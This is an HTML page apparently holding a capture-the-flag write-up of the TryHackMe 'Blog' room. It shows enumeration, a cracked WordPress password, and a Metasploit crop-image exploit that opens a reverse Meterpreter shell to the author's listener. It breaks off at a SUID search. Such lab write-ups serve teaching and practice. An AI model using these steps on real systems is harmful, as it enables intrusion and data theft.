@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="Blog Enumeration PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3hfvTN6e0P9PLtkjW4dy&#43;6vpFSh1PwKRZrML7ArPzhx1yVxBP7kxeIt3lX/qJWpxyhlsQwoLx8KDYdpOZlX5Br1PskO6H66P&#43;AwPMYwooSq24qC/Gxg4NX9MsH/lzoKnrgLDUaAqGS5ugLw6biXITEVbxrjBNdvrT1uFR9sq&#43;Yuc1JbkF8dxMF51tiQF35g0Nqo&#43;UhjmJJg73S/VI9oQtYzd2GnQC8uQxE8Vf4lZpo6ZkvTDQ7om3t/cvsnNCgwX28/TRcJ53unRPmos13iwIcuvtfKlrP5qIY75YvU4U9nmy3&#43;tjqfB1e5CESMxKjKesH0IJTRhEjAyxjQ1HUINP| 256 c2:64:ef🆎b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJtovk1nbfTPnc/1GUqCcdh8XLsFpDxKYJd96BdYGPjEEdZGPKXv5uHnseNe1SzvLZBoYz7KNpPVQ8uShudDnOI=| 256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICfVpt7khg8YIghnTYjU1VgqdsCRVz7f1Mi4o4Z45df880/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E|_http-generator: WordPress 5.0|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Billy Joel&amp;amp;#039;s IT Blog &amp;amp;#8211; The IT blog| http-robots." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/blog/blog/" />
+
+
+    <title>
+        
+             :: Zer0ne  — welcome friend
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
+    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
+    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="">
+<meta itemprop="description" content="Blog Enumeration PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3hfvTN6e0P9PLtkjW4dy&#43;6vpFSh1PwKRZrML7ArPzhx1yVxBP7kxeIt3lX/qJWpxyhlsQwoLx8KDYdpOZlX5Br1PskO6H66P&#43;AwPMYwooSq24qC/Gxg4NX9MsH/lzoKnrgLDUaAqGS5ugLw6biXITEVbxrjBNdvrT1uFR9sq&#43;Yuc1JbkF8dxMF51tiQF35g0Nqo&#43;UhjmJJg73S/VI9oQtYzd2GnQC8uQxE8Vf4lZpo6ZkvTDQ7om3t/cvsnNCgwX28/TRcJ53unRPmos13iwIcuvtfKlrP5qIY75YvU4U9nmy3&#43;tjqfB1e5CESMxKjKesH0IJTRhEjAyxjQ1HUINP| 256 c2:64:ef🆎b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJtovk1nbfTPnc/1GUqCcdh8XLsFpDxKYJd96BdYGPjEEdZGPKXv5uHnseNe1SzvLZBoYz7KNpPVQ8uShudDnOI=| 256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICfVpt7khg8YIghnTYjU1VgqdsCRVz7f1Mi4o4Z45df880/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E|_http-generator: WordPress 5.0|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Billy Joel&amp;#039;s IT Blog &amp;#8211; The IT blog| http-robots.">
+
+<meta itemprop="wordCount" content="1990"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>
+
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="Blog Enumeration PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3hfvTN6e0P9PLtkjW4dy&#43;6vpFSh1PwKRZrML7ArPzhx1yVxBP7kxeIt3lX/qJWpxyhlsQwoLx8KDYdpOZlX5Br1PskO6H66P&#43;AwPMYwooSq24qC/Gxg4NX9MsH/lzoKnrgLDUaAqGS5ugLw6biXITEVbxrjBNdvrT1uFR9sq&#43;Yuc1JbkF8dxMF51tiQF35g0Nqo&#43;UhjmJJg73S/VI9oQtYzd2GnQC8uQxE8Vf4lZpo6ZkvTDQ7om3t/cvsnNCgwX28/TRcJ53unRPmos13iwIcuvtfKlrP5qIY75YvU4U9nmy3&#43;tjqfB1e5CESMxKjKesH0IJTRhEjAyxjQ1HUINP| 256 c2:64:ef🆎b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJtovk1nbfTPnc/1GUqCcdh8XLsFpDxKYJd96BdYGPjEEdZGPKXv5uHnseNe1SzvLZBoYz7KNpPVQ8uShudDnOI=| 256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICfVpt7khg8YIghnTYjU1VgqdsCRVz7f1Mi4o4Z45df880/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E|_http-generator: WordPress 5.0|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Billy Joel&amp;#039;s IT Blog &amp;#8211; The IT blog| http-robots."/>
+
+
+
+    <meta property="og:title" content="" />
+<meta property="og:description" content="Blog Enumeration PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3hfvTN6e0P9PLtkjW4dy&#43;6vpFSh1PwKRZrML7ArPzhx1yVxBP7kxeIt3lX/qJWpxyhlsQwoLx8KDYdpOZlX5Br1PskO6H66P&#43;AwPMYwooSq24qC/Gxg4NX9MsH/lzoKnrgLDUaAqGS5ugLw6biXITEVbxrjBNdvrT1uFR9sq&#43;Yuc1JbkF8dxMF51tiQF35g0Nqo&#43;UhjmJJg73S/VI9oQtYzd2GnQC8uQxE8Vf4lZpo6ZkvTDQ7om3t/cvsnNCgwX28/TRcJ53unRPmos13iwIcuvtfKlrP5qIY75YvU4U9nmy3&#43;tjqfB1e5CESMxKjKesH0IJTRhEjAyxjQ1HUINP| 256 c2:64:ef🆎b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJtovk1nbfTPnc/1GUqCcdh8XLsFpDxKYJd96BdYGPjEEdZGPKXv5uHnseNe1SzvLZBoYz7KNpPVQ8uShudDnOI=| 256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICfVpt7khg8YIghnTYjU1VgqdsCRVz7f1Mi4o4Z45df880/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E|_http-generator: WordPress 5.0|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Billy Joel&amp;#039;s IT Blog &amp;#8211; The IT blog| http-robots." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/blog/blog/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
+
+<meta property="og:site_name" content="Zer0ne" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">Zer0ne #</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/blog/blog/"></a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="blog">Blog</h1>
+<!-- raw HTML omitted -->
+<h2 id="enumeration">Enumeration</h2>
+<pre tabindex="0"><code>PORT    STATE SERVICE     REASON  VERSION
+22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3hfvTN6e0P9PLtkjW4dy+6vpFSh1PwKRZrML7ArPzhx1yVxBP7kxeIt3lX/qJWpxyhlsQwoLx8KDYdpOZlX5Br1PskO6H66P+AwPMYwooSq24qC/Gxg4NX9MsH/lzoKnrgLDUaAqGS5ugLw6biXITEVbxrjBNdvrT1uFR9sq+Yuc1JbkF8dxMF51tiQF35g0Nqo+UhjmJJg73S/VI9oQtYzd2GnQC8uQxE8Vf4lZpo6ZkvTDQ7om3t/cvsnNCgwX28/TRcJ53unRPmos13iwIcuvtfKlrP5qIY75YvU4U9nmy3+tjqfB1e5CESMxKjKesH0IJTRhEjAyxjQ1HUINP
+|   256 c2:64:ef🆎b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJtovk1nbfTPnc/1GUqCcdh8XLsFpDxKYJd96BdYGPjEEdZGPKXv5uHnseNe1SzvLZBoYz7KNpPVQ8uShudDnOI=
+|   256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICfVpt7khg8YIghnTYjU1VgqdsCRVz7f1Mi4o4Z45df8
+
+80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+|_http-generator: WordPress 5.0
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Billy Joel&amp;#039;s IT Blog &amp;#8211; The IT blog
+| http-robots.txt: 1 disallowed entry 
+|_/wp-admin/
+
+139/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: blog
+|   NetBIOS computer name: BLOG\x00
+|   Domain name: \x00
+|   FQDN: blog
+|_  System time: 2022-03-26T14:59:50+00:00
+|_clock-skew: mean: 3m01s, deviation: 0s, median: 3m00s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-03-26T14:59:51
+|_  start_date: N/A
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| nbstat: NetBIOS name: BLOG, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| Names:
+|   BLOG&lt;00&gt;             Flags: &lt;unique&gt;&lt;active&gt;
+|   BLOG&lt;03&gt;             Flags: &lt;unique&gt;&lt;active&gt;
+|   BLOG&lt;20&gt;             Flags: &lt;unique&gt;&lt;active&gt;
+|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
+|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
+| Statistics:
+|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 53047/tcp): CLEAN (Couldn&#39;t connect)
+|   Check 2 (port 17529/tcp): CLEAN (Couldn&#39;t connect)
+|   Check 3 (port 37381/udp): CLEAN (Timeout)
+|   Check 4 (port 13635/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+</code></pre><p>And because it is wordpress (It could not be more obvious)</p>
+<p>I add some wpscan to get the version (mostly)</p>
+<pre tabindex="0"><code>...
+
+[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
+ | Found By: Emoji Settings (Passive Detection)
+ |  - http://10.10.72.96/, Match: &#39;wp-includes\/js\/wp-emoji-release.min.js?ver=5.0&#39;
+ | Confirmed By: Meta Generator (Passive Detection)
+ |  - http://10.10.72.96/, Match: &#39;WordPress 5.0&#39;
+...
+</code></pre><p>It&rsquo;s sometimes in the meta tags in source code, but hey wpscan fast</p>
+<p>On the website there is many refferences to a <code>blog.thm</code> domain</p>
+<pre tabindex="0"><code>&lt;form role=&#34;search&#34;  method=&#34;get&#34; class=&#34;search-form&#34; action=&#34;http://blog.thm/&#34;&gt;
+
+http://blog.thm/author/kwheel/
+</code></pre><p>So obvioulsy we add it to our <code>hosts</code> file</p>
+<p>This might suggest there is a subdomain to look for but let&rsquo;s check the rest first</p>
+<p>We can check the samba share first</p>
+<h3 id="enum4linux">Enum4linux</h3>
+<pre tabindex="0"><code>└──╼ $enum4linux 10.10.72.96
+
+...
+
+ ======================================== 
+|    Share Enumeration on 10.10.72.96    |
+ ======================================== 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        BillySMB        Disk      Billy&#39;s local SMB Share
+        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
+SMB1 disabled -- no workgroup available
+
+[+] Attempting to map shares on 10.10.72.96
+//10.10.72.96/print$    Mapping: DENIED, Listing: N/A
+//10.10.72.96/BillySMB  Mapping: OK, Listing: OK
+//10.10.72.96/IPC$      [E] Can&#39;t understand response:
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+
+...
+
+ ====================================================================== 
+|    Users on 10.10.72.96 via RID cycling (RIDS: 500-550,1000-1050)    |
+ ====================================================================== 
+[I] Found new SID: S-1-22-1
+[I] Found new SID: S-1-5-21-3132497411-2525593288-1635041108
+[I] Found new SID: S-1-5-32
+[+] Enumerating users using SID S-1-5-21-3132497411-2525593288-1635041108 and logon username &#39;&#39;, password &#39;&#39;
+S-1-5-21-3132497411-2525593288-1635041108-500 *unknown*\*unknown* (8)
+S-1-5-21-3132497411-2525593288-1635041108-501 BLOG\nobody (Local User)
+...
+S-1-5-21-3132497411-2525593288-1635041108-513 BLOG\None (Domain Group)
+...
+</code></pre><p>Yeah I could just use smbclient directly lol</p>
+<pre tabindex="0"><code>└──╼ $smbclient //10.10.72.96/BillySMB// -U anonymous
+Enter WORKGROUP\anonymous&#39;s password: 
+Try &#34;help&#34; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Tue May 26 19:17:05 2020
+  ..                                  D        0  Tue May 26 18:58:23 2020
+  Alice-White-Rabbit.jpg              N    33378  Tue May 26 19:17:01 2020
+  tswift.mp4                          N  1236733  Tue May 26 19:13:45 2020
+  check-this.png                      N     3082  Tue May 26 19:13:43 2020
+
+                15413192 blocks of size 1024. 9790340 blocks available
+
+smb: \&gt; get Alice-White-Rabbit.jpg
+getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (34,7 KiloBytes/sec) (average 34,7 KiloBytes/sec)
+
+smb: \&gt; get check-this.png
+getting file \check-this.png of size 3082 as check-this.png (5,2 KiloBytes/sec) (average 23,5 KiloBytes/sec)
+
+smb: \&gt; get tswift.mp4
+parallel_read returned NT_STATUS_IO_TIMEOUT
+</code></pre><p>Yeah I know the tswift.mp4 video was probably not useful but I wanted to see wich taylor swift song it was</p>
+<p>Now let&rsquo;s check our loot! First the QR code (I use zbar tools)</p>
+<pre tabindex="0"><code>└──╼ $zbarimg check-this.png
+QR-Code:https://qrgo.page.link/M6dE
+scanned 1 barcode symbols from 1 images in 0,01 seconds
+</code></pre><p>Haha another rabbit hole! legendary song btw!!</p>
+<pre tabindex="0"><code>└──╼ $steghide --extract -sf  Alice-White-Rabbit.jpg
+Entrez la passphrase: 
+�criture des donn�es extraites dans &#34;rabbit_hole.txt&#34;.
+</code></pre><p>OMFG! I knew it! XD</p>
+<p>I knew it and I just kept digging&hellip;</p>
+<p>And my friends I wanted to share all this with ya&rsquo;ll</p>
+<p>So now you know how frustrating the cyber can be sometimes</p>
+<p>ok Back to the real thing (the blog)</p>
+<p>There is a comment from billy joel&rsquo;s mother (kwhell) but that&rsquo;s all&hellip;so we dig again</p>
+<h3 id="ffuf">ffuf</h3>
+<pre tabindex="0"><code>                        [Status: 200, Size: 32028, Words: 1628, Lines: 416]
+.htaccess               [Status: 403, Size: 273, Words: 20, Lines: 10]
+.hta                    [Status: 403, Size: 273, Words: 20, Lines: 10]
+.htpasswd               [Status: 403, Size: 273, Words: 20, Lines: 10]
+0                       [Status: 301, Size: 0, Words: 1, Lines: 1]
+admin                   [Status: 302, Size: 0, Words: 1, Lines: 1]
+atom                    [Status: 301, Size: 0, Words: 1, Lines: 1]
+dashboard               [Status: 302, Size: 0, Words: 1, Lines: 1]
+embed                   [Status: 301, Size: 0, Words: 1, Lines: 1]
+favicon.ico             [Status: 200, Size: 0, Words: 1, Lines: 1]
+feed                    [Status: 301, Size: 0, Words: 1, Lines: 1]
+index.php               [Status: 301, Size: 0, Words: 1, Lines: 1]
+login                   [Status: 302, Size: 0, Words: 1, Lines: 1]
+n                       [Status: 301, Size: 0, Words: 1, Lines: 1]
+N                       [Status: 301, Size: 0, Words: 1, Lines: 1]
+no                      [Status: 301, Size: 0, Words: 1, Lines: 1]
+note                    [Status: 301, Size: 0, Words: 1, Lines: 1]
+page1                   [Status: 301, Size: 0, Words: 1, Lines: 1]
+rdf                     [Status: 301, Size: 0, Words: 1, Lines: 1]
+robots.txt              [Status: 200, Size: 67, Words: 4, Lines: 4]
+rss                     [Status: 301, Size: 0, Words: 1, Lines: 1]
+rss2                    [Status: 301, Size: 0, Words: 1, Lines: 1]
+server-status           [Status: 403, Size: 273, Words: 20, Lines: 10]
+w                       [Status: 301, Size: 0, Words: 1, Lines: 1]
+W                       [Status: 301, Size: 0, Words: 1, Lines: 1]
+welcome                 [Status: 301, Size: 0, Words: 1, Lines: 1]
+wp-admin                [Status: 301, Size: 307, Words: 20, Lines: 10]
+wp-content              [Status: 301, Size: 309, Words: 20, Lines: 10]
+wp-includes             [Status: 301, Size: 310, Words: 20, Lines: 10]
+xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1]
+</code></pre><p>Once again gentlemen&hellip;we found nothing useful!</p>
+<p>That is where I had the brilliant idea..to focus!</p>
+<p>It&rsquo;s a fricking wordpress blog! how do we usually deal with those?</p>
+<ul>
+<li>
+<p>plugins (#1 reson for wordpress bad reputation)</p>
+</li>
+<li>
+<p>Crack admin password and abuse dashboard&rsquo;s php pages</p>
+</li>
+</ul>
+<p>We have two users so far (kwheel and bjoel)</p>
+<p>Lets crack them&hellip;seems like it&rsquo;s the mom that got a weak one</p>
+<pre tabindex="0"><code>[+] Performing password attack on Xmlrpc against 1 user/s
+[SUCCESS] - kwheel / cutiepie1                                                                                                                                                                                                              
+Trying kwheel / adelina Time: 00:03:35 &lt;                                                                                                                                                           &gt; (2865 / 14347257)  0.01%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: kwheel, Password: cutiepie1
+</code></pre><p>Geez that was faster than earlier! now I login with those and access the dashboard!</p>
+<p>Aaaaand i could not do much&hellip;we can&rsquo;t edit the pages! how am I supposed to put a shell in there?</p>
+<p>Maybe there is an authenticated vulnerability we can explot&hellip;</p>
+<p>Seems like the version 5.0 is filled with them&hellip;</p>
+<pre tabindex="0"><code>└──╼ $searchsploit wordpress 5.0
+-----------------------------------------------------------------------
+ Exploit         Title                                       |  Path
+---------------------------------------------------------------------------------
+WordPress 5.0.0 - Image Remote Code Execution                | php/webapps/49512.py
+
+WordPress Core 5.0 - Remote Code Execution                   | php/webapps/46511.js
+
+WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)  | php/remote/46662.rb
+                                                                             
+...
+
+--------------------------------------------------------------------
+</code></pre><p>Found alot but 3 for RCE (one is a metasploit module)</p>
+<p>I tried the first two, but didnt work&hellip;so it seems like metasploit is the way</p>
+<pre tabindex="0"><code>msf6 &gt; search wordpress 5.0
+
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  exploit/multi/http/wp_crop_rce               2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
+   1  exploit/unix/webapp/wp_property_upload_exec  2012-03-26       excellent  Yes    WordPress WP-Property PHP File Upload Vulnerability
+
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/webapp/wp_property_upload_exec
+
+msf6 &gt; use 0
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit(multi/http/wp_crop_rce) &gt;
+</code></pre><p>I didnt use metasploit in a while and It&rsquo;s kinda cool to set options again</p>
+<pre tabindex="0"><code>msf6 exploit(multi/http/wp_crop_rce) &gt; options
+
+Module options (exploit/multi/http/wp_crop_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD   cutiepie1        yes       The WordPress password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.174.85     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the wordpress application
+   USERNAME   kwheel           yes       The WordPress username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.8.226.203     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   WordPress
+</code></pre><p>Now magic</p>
+<pre tabindex="0"><code>msf6 exploit(multi/http/wp_crop_rce) &gt; run
+
+[-] Handler failed to bind to 10.8.226.203:4444:-  -
+[*] Started reverse TCP handler on 0.0.0.0:4444 
+[*] Authenticating with WordPress using kwheel:cutiepie1...
+[+] Authenticated with WordPress
+[*] Preparing payload...
+[*] Uploading payload
+[+] Image uploaded
+[*] Including into theme
+[*] Sending stage (39282 bytes) to 10.0.2.2
+[*] Attempting to clean up files...
+[*] Meterpreter session 1 opened (10.0.2.15:4444 -&gt; 10.0.2.2:32972 ) at 2022-03-26 20:04:39 +0100
+
+meterpreter &gt; getuid
+Server username: www-data
+
+meterpreter &gt; sysinfo
+Computer    : blog
+OS          : Linux blog 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64
+Meterpreter : php/linux
+</code></pre><p>Ok I get a shell real quick</p>
+<pre tabindex="0"><code>meterpreter &gt; shell
+Process 1608 created.
+Channel 1 created.
+
+cd /home
+ls
+bjoel
+cd bjoel
+ls
+Billy_Joel_Termination_May20-2020.pdf
+user.txt
+cat user.txt
+You won&#39;t find what you&#39;re looking for here.
+
+TRY HARDER
+exit
+</code></pre><p>Nieh! I am denied access to things again!</p>
+<pre tabindex="0"><code>meterpreter &gt; download Billy_Joel_Termination_May20-2020.pdf
+[*] Downloading: Billy_Joel_Termination_May20-2020.pdf -&gt; /home/THM/Blog/Billy_Joel_Termination_May20-2020.pdf
+[*] Downloaded 67.49 KiB of 67.49 KiB (100.0%): Billy_Joel_Termination_May20-2020.pdf -&gt; /home/THM/Blog/Billy_Joel_Termination_May20-2020.pdf
+[*] download   : Billy_Joel_Termination_May20-2020.pdf -&gt; /home/THM/Blog/Billy_Joel_Termination_May20-2020.pdf
+</code></pre><p>We all found the pdf suspicious! so I downloaded it (meterpreter is just awesome)</p>
+<p>meh&hellip;not useful (poor billy joel, I dont even know what tardiness means XD)</p>
+<p>The author of this room just love rabbit holes!</p>
+<p>Maybe we have to directly try to escalate &hellip;</p>
+<h2 id="privilege-escalation">Privilege escalation</h2>
+<p>sudo -l would not be possible so let&rsquo;s look for SUID</p>
+<pre tabindex="0"><code>find / -perm -u=s 2&gt;/dev/null
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/newuidmap
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/at
+/usr/bin/newgidmap
+/usr/bin/traceroute6.iputils
+/usr/sbin/checker
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
